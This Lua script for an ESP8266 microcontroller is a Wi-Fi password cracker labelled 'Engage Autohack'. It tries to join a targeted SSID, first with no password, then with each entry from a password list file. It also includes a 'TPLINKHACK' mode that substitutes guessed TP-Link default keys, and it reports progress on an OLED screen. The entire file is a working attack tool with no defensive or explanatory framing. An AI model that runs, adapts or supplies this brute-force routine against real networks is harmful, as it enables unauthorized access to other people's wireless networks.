
function wificonnect(SSID_PASSWORD)
-- Your access point's SSID and password
-- configure ESP as a station
wifi.setmode(wifi.STATION)
wifi.sta.config(ssids[mn],SSID_PASSWORD)
wifi.sta.autoconnect(1)
waittime=0

tmr.alarm(0, 500, 1, function()  
      if wifi.sta.getip()==nil then  
      print("Connecting to AP...") 
      connected=1
     else  
      tmr.stop(0)  
      print("Connected as: " .. wifi.sta.getip())  
      connected=2
     end

     if (waittime > 10000) then
      tmr.stop(0)
      print ("Connect failed")
      connected=3
     end
   waittime=waittime+500  
   end)  
end

-- We'll reinit the OLED, just in case
function init_i2c_display()
     -- SDA and SCL can be assigned freely to available GPIOs
     sda = 5 -- GPIO14
     scl = 6 -- GPIO12
     sla = 0x3c
     i2c.setup(0, sda, scl, i2c.SLOW)
     disp = u8g.ssd1306_128x64_i2c(sla)
     disp:setFont(u8g.font_6x10)
     disp:setFontRefHeightExtendedText()
     disp:setDefaultForegroundColor()
     disp:setFontPosTop()
end

function showoled(method)
disp:firstPage()  
    repeat  
       showstatus(method)
    until disp:nextPage() == false  
    tmr.wdclr()
end

function showstatus(method)
     disp:drawStr(10, 0, "Engage Autohack")
     disp:drawStr(10, 10, "on SSID: ")
     disp:drawStr(0,20, ssids[mn])
     disp:drawStr(0,30, "Trying: " .. method)
     if (connected~=2) then
      disp:drawStr(5, 40, "Connected: No")
     else
      disp:drawStr(5, 40, "Connected: Yeeeeezzz!")
     end
     if (connected==4) then
       disp:drawStr(5,50, " *** FAILED *** ") 
     elseif (connected==2) then
       disp:drawStr(5,50, " *** SUCCESS *** ")    
     else
       disp:drawStr(5,50, " --- RUNNING ---")
     end    
end

function getpwd()
  line=file.read('\n')
     if (line == "TPLINKHACK\n") then
       pwd = tplink[mn]
     elseif (line == "END\n") then
       connected=4
     elseif (line ~= "TPLINKHACK") then
       pwd = string.gsub(line, "\n", "")
       print ("Trying Password: " .. pwd)
     else
       connected=5
       pwd = "END"
     end
end

print ("Open password file")
file.open("pwlist.txt", "r")
line="dummy"

connected=0 -- 0 is undef, 1 is progress, 2 is success, 3 is failed, 5 is over
print ("Running autohack on item " .. mn)
print ("That is SSID: " .. ssids[mn])


tmr.alarm(1, 1000, 1, function()  
     if (connected==0) then
      print ("Starting connect.")
        method="Unencrypted"
        showoled(method)
        wificonnect("")
     elseif(connected==1) then
      print ("Gotta wait a bit")
     elseif(connected==3) then
      print ("This went wrong - moving on...")
      getpwd()
      method=pwd
      showoled(method)
      wificonnect(pwd)
     elseif (connected==2) then
      tmr.stop(1)  
      print("Done - we're in")
      showoled(method)
      file.close()
    -- elseif (connected==4) then
     else
      print ("Gotta give up.")
      showoled(method)
      file.close()
      tmr.stop(1)
      tmr.stop(0)
     end
end)
